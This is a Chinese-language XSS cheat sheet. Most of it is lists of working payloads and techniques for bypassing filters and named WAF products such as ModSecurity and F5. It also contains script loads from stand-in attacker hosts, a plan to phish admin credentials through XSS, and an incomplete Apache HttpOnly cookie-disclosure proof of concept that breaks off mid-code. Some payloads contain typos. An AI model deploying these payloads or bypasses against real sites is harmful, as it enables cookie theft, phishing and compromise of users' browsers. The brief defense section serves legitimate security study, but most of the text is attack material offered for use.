#知识点

跨站脚本攻击,英文全称Cross Site Script,本来编写是CSS。但是为了和层叠样式表(CSS)有所区别,所以在安全领域叫做'XSS'。XSS长期以来被列为客户端Web安全中的头号大敌
反射型XSS:反射型XSS只是简单地把用户输入的数据"反射"给浏览器。反射型XSS也叫做"非持久型XSS"
存储型XSS,未复现。概念:存储型XSS会把用户输入的数据"存储"到服务器端,这种XSS具有很强的稳定性!(持久型XSS)
DOM Based XSS(基于dom的XSS)
	"write"按钮的onclick事件调用了test()函数,而在test函数中,修改了页面的DOM节点,通过innerHTML把一段用户数据当作HTML写入到页面中,这就造成了DOM based XSS

#XSS触发姿势小结

	<a onmousemove="alert(/xss1/)">this is test1</a> <!--可以执行成功-->
	<a onmousemove=alert(/xss2/)>this is test2</a>   <!--可以执行成功-->
	<a Onmousemove=alert(/xss3/)>this is test3</a>   <!--可以执行成功-->
	<img src=x onerror=alert&#x28;1&#x29;>           <!--可以执行成功-->
	<img src=x onerror=alert(2)>           <!--可以执行成功-->
	<img src=x Onerror=alert&#40;3&#41;>    <!--可以执行成功-->
	<img src=x OneRror=alert(String.fromCharCode(27979,35797))> <!--可以执行成功-->
	<img src=x onerror=alert>
	<svg/onload=alert(/xss4/)>  <!--可以执行成功-->
	<svg onload=alert(/xss5/)>    <!--可以执行成功-->
	<img/src=x onerror=alert(/xss6/)>     <!--可以执行成功-->
	<img src=x onerror=prompt(&#34;xss7&#34;)>  <!--可以执行成功-->
	<img/src=x onerror=prompt&#x28;&#34;xss8&#34;&#x29;>   <!--可以执行成功-->
	<img/src=x onerror=alert(/xxxxxxxxxxxx/)     <!--可以执行成功-->
	<a href=javascript:alert(/xss9/)>X你</a>     <!--可以执行成功-->
	<a href=jAVascript:prompt(&#x2f;xss10&#x2f;)>X你哟</a>   <!--可以执行成功-->
	<a/href=Javascript:alert%28%2fxss11%2f%29>剪你哟</a>  <!--可以执行成功-->
	<img/**/src=x onerror=prompt&#40;100&#x29;> <!--可以执行成功-->
	<img/**/src=x onerror=alert&#40;&#x2f;1000&#47;&#x29;>   <!--可以执行成功-->
    <img src=x onerror=&#97;lert(10000)>    <!--可以执行成功-->
    <img src=x onerror=&#x61;&#x6c;ert(100000)>    <!--可以执行成功-->
    <img src=x OnError=&#97;l&#x65;rt(/xss12/)>   <!--可以执行成功-->
    <a href=javascript:alert&#40;10%29>插插插</a>   <!--可以执行成功-->
    <a href=javascript:confirm(/xss/)>test</a>    <!--可以执行成功-->
    <a href=Javascript:cnfirm%28&#47;xss1%2f%29>test1</a>  <!--可以执行成功-->
    <img src=x onerror=confirm(/xss13/)>   <!--可以执行成功-->
    <img src=x Onerror=&#99;onf&#x69;rm&#40;&#47;xss14&#47;&#x29;>   <!--可以执行成功-->
    <a href="baidu.com" onmOusemove=alert%281%28>hhhhh</a>   <!--可以执行成功-->
    <a href="baidu.com" oNmousemove=alert&#40;1&#41;>vvvv</a>   <!--可以执行成功-->
    <a href="http://baidu.com" onfocus=confirm(1)>test</a>   <!--可以执行成功-->
	<sCriPt>alert(1)</SCRipt> <!--可以执行成功-->
	<sCriPt>confirm(2)</SCRipt> <!--可以执行成功-->
	<sCriPt>prompt(3)</SCRipt>  <!--可以执行成功-->
	<iframe src=Javascript:alert(String.fromCharCode(52))>  <!--可以执行成功-->
	<a href="Javascript:'1absss'+alert(1)">go</a>  <!--可以执行成功-->
	<a href="baidu.com" oNmousemove=alert&#40;1&#41;>vvvv</a>  <!--可以执行成功-->
	<a href="http://baidu.com" onfocus=confirm(1)>test</a>  <!--可以执行成功-->
	<textarea onfocus=alert(1)>  <!--可以执行成功-->
	<body onload=prompt(10)>  <!--可以执行成功-->
	<img src=x autofocus onclick=alert(30)>  <!--可以执行成功-->
	<svg><script>alert&#40/1/&#41</script>   <!--可以执行成功-->
	<script type="text/javascript">
	<svg><script>alert&#40/2/&#41</script>

#常见的绕过技术

	大小写绕过
	引号的闭合,导致XSS
		" onclick=alert(1) "
	使用标签闭合方法弹窗!
	payload如下:'><img src=x onerror=alert(1)>
	使用location.name方法弹窗!不错的姿势!
	payload如下:' name=javascript:alert(1)  autofocus onfocus='location=this.name
	利用location.hash方法弹窗!触发XSS
	payload如下:' onclick="eval(location.hash.substr(1))" "

##常规插入及其绕过

		1. Script 标签
		绕过进行一次移除操作：  
		`<scr<script>ipt>alert("XSS")</scr<script>ipt>`  
		Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：  
		`<script>alert("XSS")</script>`  
		`<script src="http://attacker.org/malicious.js"></script>` 
 
		2. JavaScript 事件
		我们可以像如下这样在元素中定义 JavaScript 事件：
		`<div onclick="alert('xss')">`
		这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：
			`<div onmouseenter="alert('xss')">`
		当用户鼠标移动到 div 上时就会触发我们的代码。
		另一个绕过的办法就是在属性和= 之间插入一个空格：
			`<div onclick ="alert('xss')">`

		3. 行内样式(Inline style)
		我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：
		`<div style="color: expression(alert('XSS'))">`
		过滤器会检查关键字 style，随后跟随的不能是 <，在随后是 expression：
		`/style=[^<]*((expression\s*?[<]∗?)|(behavior\s*:))[^<]*(?=\>)/Uis`
		所以，让我们需要把 < 放到其他地方：
		`<div style="color: '<'; color: expression(alert('XSS'))">`

		4. CSS import
		IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。
		<style>
		@import url("http://attacker.org/malicious.css");
		</style>
		malicious.css：
		body {
		    color: expression(alert('XSS'));
		}
		为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：
		<style>
		@imp\ort url("http://attacker.org/malicious.css");
		</style>
		IE 浏览器会接受反斜杠，但是我们绕过了过滤器。

		5. Javascript URL
		链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：
		<a href="javascript:alert('test')">link</a>
		上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：
		<a href="java&#115;cript:alert('xss')">link</a>
		上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。
		另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：
		<a href='vbscript:MsgBox("XSS")'>link</a>
		'-confirm`1`-'
		'-confirm(1)-'
##绕过技术

		1 利用字符编码
		%c1;alert(/xss/);//

		2 绕过长度限制
		"onclick=alert(1)//
		"><!--
		--><script>alert(xss);<script>

		3 使用<base>标签
		<script>alert(navigator.userAgent)<script>
		<script>alert(88199)</script>
		<script>confirm(88199)</script>
		<script>prompt(88199)</script>
		<script>\u0061\u006C\u0065\u0072\u0074(88199)</script>
		<script>+alert(88199)</script>
		<script>alert(/88199/)</script>
		<script src=data:text/javascript,alert(88199)></script>
		<script src=&#100&#97&#116&#97:text/javascript,alert(88199)></script>
		<script>alert(String.fromCharCode(49,49))</script>
		<script>alert(/88199/.source)</script>
		<script>setTimeout(alert(88199),0)</script>
		<script>document['write'](88199);</script>
		
		<anytag onmouseover=alert(15)>M
		<anytag onclick=alert(16)>M
		<a onmouseover=alert(17)>M
		<a onclick=alert(18)>M
		<a href=javascript:alert(19)>M
		<button/onclick=alert(20)>M
		<form><button
		formaction=javascript&colon;alert(21)>M
		<form/action=javascript:alert(22)><input/type=submit>
		<form onsubmit=alert(23)><button>M
		<form onsubmit=alert(23)><button>M
		<img src=x onerror=alert(24)> 29
		<body/onload=alert(25)>
		
		<body
		onscroll=alert(26)><br><br><br><br><br><br><br>
		<br><br><br><br><br><br><br><br><br><br><br>
		<br><br><br><br><br><br><br><br><br><br><br>
		<br><br><br><br><br><br><br><br><br><br><br>
		<input autofocus>
		
		<iframe src="http://0x.lv/xss.swf"></iframe>
		<iframe/onload=alert(document.domain)></iframe>
		<IFRAME SRC="javascript:alert(29);"></IFRAME>
		<meta http-equiv="refresh" content="0;
		url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E">
		<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+></object>
		<object data="javascript:alert(document.domain)">
		
		
		<marquee onstart=alert(30)></marquee>
		<isindex type=image src=1 onerror=alert(31)>
		<isindex action=javascript:alert(32) type=image>
		<input onfocus=alert(33) autofocus>
		<input onblur=alert(34) autofocus><input autofocus>
##规则探测及绕过

		1. WAF规则探测
			1、使用无害的payload，类似<b>,<i>,<u>观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤<>等等；
			2、如果过滤闭合标签，尝试无闭合标签的payload（<b,<i,<marquee）观察响应；
			3、尝试以下的payload
			<script>alert(1);</script>
			<script>prompt(1);</script>
			<script>confirm      (1);</script>
			
			<script src="http://rhainfosec.com/evil.js">

		2. 大小写混合字符
		<scRiPt>alert(1);</scrIPt>
			1、如果大小写不行的话，<script>被过滤尝试<scr<script>ipt>alert(1)</scr<script>ipt>；
			2、使用<a>标签测试
		<a  href=“http://www.google.com">Clickme</a>
		<a被过滤？
		href被过滤？
		其他内容被过滤？
		如果没有过滤尝试使用
		<a href=”javascript:alert(1)”>Clickme</a>
		尝试使用错误的事件查看过滤
		<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>
		HTML5拥有150个事件处理函数，可以多尝试其他函数
		<body/onhashchange=alert(1)><a href=#>clickit

		3. 测试其他标签
		src属性
			<img src=x      onerror=prompt(1);>
			<img/src=aaa.jpg      onerror=prompt(1);
			<video src=x      onerror=prompt(1);>
			<audio src=x      onerror=prompt(1);>
		iframe
			<iframesrc="javascript:alert(2)">
			<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
		Embed
			<embed/src=//goo.gl/nlX0P>
		Action
			<form action="Javascript:alert(1)"><input type=submit>
			<isindex action="javascript:alert(1)" type=image>
			<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
			<isindex action=data:text/html, type=image>
		mario验证
			<span class="pln">    </span><span class="tag">&lt;formaction</span><span class="pun">=</span><span class="atv">&amp;#039;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&amp;#039;</span><span class="tag">&gt;&lt;button&gt;</span><span class="pln">CLICK</span>
		“formaction”属性
			<isindexformaction="javascript:alert(1)"      type=image>
			<input type="image" formaction=JaVaScript:alert(0)>
			 <form><button formaction=javascript&colon;alert(1)>CLICKME
		“background”属性
			<table background=javascript:alert(1)></table> // Works on Opera 10.5      and IE6
		“posters” 属性
			<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5
		“data”属性
			<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
			<object/data=//goo.gl/nlX0P?
		“code”属性
			<applet code="javascript:confirm(document.cookie);"> // Firefox Only
			<embed  code="http://businessinfo.co.uk/labs/xss/xss.swf"      allowscriptaccess=always>
		事件处理
			<svg/onload=prompt(1);>
			<marquee/onstart=confirm(2)>/
			<body onload=prompt(1);>
			<select autofocus onfocus=alert(1)>
			<textarea autofocus onfocus=alert(1)>
			<keygen autofocus onfocus=alert(1)>
			<video><source onerror="javascript:alert(1)">
		短payload
			<q/oncut=open()>
			<q/oncut=alert(1)> //      Useful in-case of payload restrictions.
		嵌套欺骗
			<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>
			<body  language=vbsonload=alert-1 // Works with IE8
			<command onmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6    9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command>      // Works with IE8
		圆括号被过滤
			<a onmouseover="javascript:window.onerror=alert;throw 1>
			<img src=x onerror="javascript:window.onerror=alert;throw 1">
			<body/onload=javascript:window.onerror=eval;throw&#039;=alert\x281\x29&#039;;
		Expression 属性
			<img style="xss:expression(alert(0))"> // Works upto IE7.
			<div style="color:rgb(&#039;&#039;x:expression(alert(1))"></div>      // Works upto IE7.
			<style>#test{x:expression(alert(/XSS/))}</style>      // Works upto IE7
		“location”属性
			<a onmouseover=location=’javascript:alert(1)>click
			<body onfocus="location=&#039;javascrpt:alert(1) >123
		其他Payload
			<meta http-equiv="refresh"      content="0;url=//goo.gl/nlX0P">
			<meta http-equiv="refresh"      content="0;javascript&colon;alert(1)"/>
			<svg xmlns="http://www.w3.org/2000/svg"><g      onload="javascript:\u0061lert(1);"></g></svg> //      By @secalert
			<svg xmlns:xlink=" r=100 /><animate attributeName="xlink:href"      values=";javascript:alert(1)" begin="0s"      dur="0.1s" fill="freeze"/> // By Mario
			<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"</svg> // By@secalert
			<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
			<math><a xlink:href="//jsfiddle.net/t846h/">click // By Ashar Javed
		（）；：被过滤
			<svg><script>alert&#40/1/&#41</script>      // Works With All Browsers
			( is html encoded to &#40
			 ) is html encoded to &#41
		Opera的变量
			<svg><script>alert&#40      1&#41 // Works with Opera Only
		实体解码
			&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
			<a  href="j&#x26;#x26#x41;vascript:alert%252831337%2529">Hello</a>
		编码
			JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码
			（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）
			href=
			action=
			formaction=
			location=
			on*=
			name=
			background=
			poster=
			src=
			code=
			data= //只支持base64

		4. 基于上下文的过滤
		WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式

		(1)输入反射属性
			<input value="XSStest" type=text>
			我们可以使用 “><imgsrc=x  onerror=prompt(0);>触发，但是如果<>被过滤，我们仍然可以使用“ autofocusonfocus=alert(1)//触发，基本是使用“ 关闭value属性，再加入我们的执行脚本
			" onmouseover="prompt(0) x="
			" onfocusin=alert(1)     autofocus x="
			" onfocusout=alert(1)     autofocus x="
			" onblur=alert(1) autofocus     a="
			输入反射在<script>标签内
			类似这种情况：
			<script>
			Var
			x=”Input”;
			</script>
			通常，我们使用“></script>,闭合前面的</script>标签，然而在这种情况，我们也可以直接输入执行脚本alert(), prompt()
			confirm() ，例如：
			“;alert(1)//
		(2)非常规事件监听
			DOMfocusin,DOMfocusout,等事件，这些需要特定的事件监听适当的执行。例如：
			";document.body.addEventListener("DOMActivate",alert(1))//
			";document.body.addEventListener("DOMActivate",prompt(1))//
			";document.body.addEventListener("DOMActivate",confirm(1))//
			此类事件的列表
			DOMAttrModified
			DOMCharacterDataModified
			DOMFocusIn
			DOMFocusOut
			DOMMouseScroll
			DOMNodeInserted
			DOMNodeInsertedIntoDocument
			DOMNodeRemoved
			DOMNodeRemovedFromDocument
			DOMSubtreeModified
		(3)超文本内容
			代码中的情况如下
			<a
			href=”Userinput”>Click</a>
			可以使用javascript:alert(1)//直接执行<a
			href=”javascript:alert(1)//”>Click</a>
		(4)变形
			主要包含大小写和JavaScript变形
			javascript&#058;alert(1)
			javaSCRIPT&colon;alert(1)
			JaVaScRipT:alert(1)
			javas&Tab;cript:\u0061lert(1);
			javascript:\u0061lert&#x28;1&#x29
			avascript&#x3A;alert&lpar;document&period;cookie&rpar;      // AsharJaved
			IE10以下和URI中可以使用VBScript
			vbscript:alert(1);
			vbscript&#058;alert(1);
			vbscr&Tab;ipt:alert(1)"
			Data URl
			data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
		(5)JSON内容
			反射输入
			encodeURIComponent(&#039;userinput&#039;)
			可以使用
			-alert(1)-
			-prompt(1)-
			-confirm(1)-
			结果
			encodeURIComponent(&#039;&#039;-alert(1)-&#039;&#039;)
			encodeURIComponent(&#039;&#039;-prompt(1)-&#039;&#039;)
		(6)输入反射在svg标签内
			源码如下：
			<svg><script>varmyvar=”YourInput”;</script></svg>
			可以输入
			www.site.com/test.php?var=text”;alert(1)//
			如果系统编码了”字符
			<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
			原因是引入了附加的（XML）到HTML内容里，可以使用2次编码处理
			浏览器BUG
		(7)字符集BUG
			字符集BUG在IE中很普遍，最早的bug是UTF-7。如果能控制字符集编码，我们可以绕过99% 的WAF过滤。
			示例
			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&v=XSS
			可以控制编码，提交
			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&v=”><img
			src=x onerror=prompt(0);>
			可以修改为UTF-32编码形式
			???script?alert(1)?/script?
			http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
		(8)空字节
			最长用来绕过mod_security防火墙，形式如下：
			<scri%00pt>alert(1);</scri%00pt>
			<scri\x00pt>alert(1);</scri%00pt>
			<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
			空字节只适用于PHP 5.3.8以上的版本
		(9)语法BUG
			RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行
			<script>alert(1);</script>
			<%0ascript>alert(1);</script>
			<%0bscript>alert(1);</script>
			<%, <//, <!,<?可以被解析成<，所以可以使用以下的payload
			<//     style=x:expression\28write(1)\29> // Works upto IE7 参考http://html5sec.org/#71
			<!--[if]><script>alert(1)</script     --> // Works upto IE9 参考http://html5sec.org/#115
			<?xml-stylesheet     type="text/css"?><root     style="x:expression(write(1))"/> // Works in IE7 参考 http://html5sec.org/#77
			<%div%20style=xss:expression(prompt(1))>     // Works Upto IE7
		(10)Unicode分隔符
			[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：
			IExplorer=     [0x09,0x0B,0x0C,0x20,0x3B]
			Chrome =     [0x09,0x20,0x28,0x2C,0x3B]
			Safari = [0x2C,0x3B]
			FireFox=     [0x09,0x20,0x28,0x2C,0x3B]
			Opera = [0x09,0x20,0x2C,0x3B]
			Android =     [0x09,0x20,0x28,0x2C,0x3B]
			x0b在Mod_security中已经被过滤，绕过的方法：
			<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
		(11)缺少X-frame选项
			通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞
			Docmodes
			IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式
			expression(open(alert(1)))
			以下POC可以插入到IE7中
			<html>
			    <body>
			    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
			    <iframesrc="https://targetwebsite.com">
			    </body>
			    </html>
		(12)Window.name欺骗
			情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码
			POC
			<iframesrc=&#039;http://www.target.com?foo="xss  autofocus/AAAAA  onfocus=location=window.name//&#039;
			name="javascript:alert("XSS")"></iframe>
			DOM型XSS
			服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：
			<script>
			    vari=location.hash;
			    document.write(i);
			    </script>
			在一些情况下，反射型XSS可以转换成DOM型XSS：
			http://www.target.com/xss.php?foo=<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()
			上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码
			Location.hash[1] = :  // Defined at the first position after     the hash.
			Location.hash[2]= (  // Defined at the second position after     the has
			Location.hash[3] = ) // Defined     at third position after the hash.
			如果有客户端过滤可能不适用
		(13)ModSecurity绕过
			<scri%00pt>confirm(0);</scri%00pt>
			<a/onmouseover[\x0b]=location=&#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#039;>rhainfosec
			参考http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html
			
		5. WEB KNIGHT绕过
			<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
			<marquee/onstart=confirm(2)>
			F5 BIG IP ASM and Palo ALTO绕过
			<table background="javascript:alert(1)"></table> //IE6或者低版本Opera
			    “/><marquee  onfinish=confirm(123)>a</marquee>
			Dot Defender绕过
			<svg/onload=prompt(1);> 
			<isindex action="javas&tab;cript:alert(1)" type=image>
			
			<marquee/onstart=confirm(2)>

		6. JS还原函数

		JS中的编码还原函数最常用的就是String.fromCharCode了，这个函数用于ascii码的还原，一般来说，这个函数都要配合EVAL来使用才有效果。
		
		在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字alert被过滤掉，那就可以这么利用：
		
		<img src="x"/**/onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,112,111,114,117,105,110,39,41))"></img>
		
		执行效果如上图一样，没有关键字同样执行想要执行的代码。

		7. 转义字符

		首先要认识一下“\”，这个不是斜杠么。对的，斜杠在JAVASCRIPT有着特殊的用途，它是转义的符号。例如，我们把我们XSS语句转换成16进制，这里是<script>alert(‘poruin’)</script>,我用在CHA88那里淘过来的脚本工具来转换，如图：(工具地址：http://tools88.com/safe/xss.php)
		
		结果如下
		
		\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E
		
		这些就是经过编码后的字符，因为前面的斜杠缘故，所以后面的这些字符在JAVASCRIPT中都会被还原。
		
		我们再来看一下测试用的index.asp
			<form name=form>
			<input type=text name=text1>
			<input type=submit name=submit>			
			</form>			
			<%			
			if request("text1")<> "" then			
			a=replace(replace(request("text1"),"<","&lt;"),">","&gt;")			
			end if			
			%>
			<script>		
			a="<%=a%>"		
			document.write(a)		
			</script>
		
		很简单的内容，接受用户的数据后过滤<>，再用JAVASCRIPT显示出来，直接输入XSS的测试语句看看，被转换掉了吧。再来输入经过16进制转换后的字符，这些字符都可以轻松的逃过过滤，完整进入代码中，经过JAVASCRIPT还原之后，正确解释出来。		
		而不但是十六进制可以，八进制同样奏效，转换后代码如下：
			\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\160\157\162\165\151\156\47\51\74\57\163\143\162\151\160\164\76

		8. UBB标签
		UBB标签是目前广泛运用到论坛，留言簿，以及其他网站系统的一种编码标签，类似[img]url[/img]这样的，用户在中间输入地址后即可，在发表的时候系统会自动改成<img src=”url”></img>。这个URL就是用户输入的图片地址，XSS攻击中，可以利用这个特点来达到无需用户输入<>就能执行由用户所输入的代码，我们只要在输入网址的地方输入：
		x"/**/onerror="alert('poruin')
		
		那么经过转换后就变成了
		
		<img src="x"/**/onerror="alert('poruin')"></img>
		
		在JS中空格可以用/**/转换

		9. %0a换行绕过
		Payload:%0aalert(0);

#如何防御XSS呢?
##思路
对用户的输入进行白名单检测!
对HTML代码进行编码
对Javascript进行javascriptencode,一层归一层,不要混肴!
使用UTF-8编码!
过滤HTML事件
给予最小权限


##常见修复方案及绕过
1. 黑名单式去除法  
	(这里只是举个过滤方法的栗子，所以过滤内容没有写很多)  
	这种可谓是远古时期的过滤法了，随便就可以绕过:
	
		<?php
		$str = $_GET['text'];
		$search = array('<script>', '</script>');
		echo str_replace($search,' ', $str);
	
		payload:<scr<script>ipt>alert(0)</sc</script>ript>

2. 黑名单式打乱法
	出自: http://www.jb51.net/article/43005.htm

		$ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base'); 
		$ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); 
		$ra = array_merge($ra1, $ra2)
		$replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2);

	在检测到敏感字符后，会加一个<x>打乱，使得语句不生效，但是要知道不基于特征的过滤方法是永远过滤不完的，这种看似过滤一大堆，但是并没有什么卵用，因为html标签和JavaScript肯定不止这些。

 

3. 特征式去除法
	出自: http://www.jquerycn.cn/a_24516

		<?php
		function safe_replace($string) {
		$string = str_replace('%20','',$string);
		$string = str_replace('%27','',$string);
		$string = str_replace('%2527','',$string);
		$string = str_replace('*','',$string);
		$string = str_replace('"','"',$string);
		$string = str_replace("'",'',$string);
		$string = str_replace('"','',$string);
		$string = str_replace(';','',$string);
		$string = str_replace('<','<',$string);
		$string = str_replace('>','>',$string);
		$string = str_replace("{",'',$string);
		$string = str_replace('}','',$string);
		$string = str_replace('','',$string);
		return $string;
		}
		?>

	这种方法相比上两种要靠谱的多，只能在特定场景下绕过，下面给出一个场景
	
	首先要知道%0a相当于回车(换行)
	
	那么在这里可以使用%0a来换行一下然后去输出
	
		Payload:%0aalert(0);

4. 特征式编码法         
	这种跟上面差不多，基于特征的只能在特定场景绕过，下面再给出一个场景:

	    <?php
	    $name = $_GET["name"];
	    $name = htmlspecialchars($name);
	    ?>
	    <input type='text' value='<?php echo $name?>'>
	
		Payload:‘onclick=’alert(0)

	Htmlspecialchars默认是不过滤单引号的，只有在quotestyle 选项为ENT_QUOTES才会过滤

5. Httponly限制最大利用XSS

		首先要知道我们像嵌入的xss.js是如何获取到目标cookie的。
		浏览器中的document对象中，就储存了Cookie的信息，而利用js可以把这里面的Cookie给取出来，在传这个cookie的值到xss平台中。
		那么应答头中含有httponly属性，客户端的一切js操作都会被禁止，不止我们盗不了cookie，连开发者都不能在前端操作cookie。

	虽然取不了cookie但仍然可以取一些敏感信息，如host，referer，IP，等。  
	(1)钓鱼
	虽然有了httponly后xss不能取到cookie，但能取到后台地址，这个时候我们可以伪造一个跟目标站相同的后台登录页面。  
	再通过xss使目标站跳转到我们的钓鱼后台登录页面。最后达到当管理员访问被xss的页面时自动跳转到我们的钓鱼页面。诱导管理员输入账号密码。  
	//后台登录钓鱼页面  
	修改action值为接收账号密码地址(http://xssir.org/x.php)
	
	接收账号密码的脚本，如果你看到服务器上多了一个add.txt就鱼儿已经上钩。
	
	(2)分析源码
	Xss不止能获取基本信息，还可以获取源码，通过源码加载的JS，CSS仍然可以获得很多有价值的信息  
	通过分析每个js的作用，分析网站后台的具体功能点，有很多意想不到的操作，这个不容易在文章中体现出来，主要还是看个人水平  
	获取源代码这个不容易在文章里体现出来，主要还是看个人的审计水平  
	
	(3)Apache httpOnly Cookie Disclosure
	这个漏洞十分罕见,当apache接收到一个大于4k的cookie的时候，会返回一个400的错误，并且把所有的cookie完整的在页面当中显示出来。  
	给用户在正常的cookie的基础上再增加一些无用的cookie，使用户的cookie大于4k，然后js再发包请求一次网站，这时apache返回的响应就是400，并把cookie显示出来，这是我们只要用js正则匹配出正常的cookie即可，由于不是js直接获取cookie，而只是正则匹配出返回的字符串而已，便相当于绕过了cookie的httponly的属性，完整的攻击需要加上把匹配的字符串再发送到自己的一个接受文件当中即可。

	POC:

	    var str = "";  
	    for (var i=0; i< 819; i++) {  
	        str += "x";  
	    }  
	    // Set cookies  
	    for (i = 0; i < 10; i++) {  
	        // Expire evil cookie  
	        if (good) {  
	            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/;";  
	        }  
	        // Set evil cookie  
	        else {  
	            var cookie = "xss"+i+"="+str+";path=/";  
	        }  
	        document.cookie = cookie;  
	    }  
		}  
		function makeRequest() {  
		    setCookies();  
		    function parseCookies () {  
		        var cookie_dict = {};  
		        // Only react on 400 status  
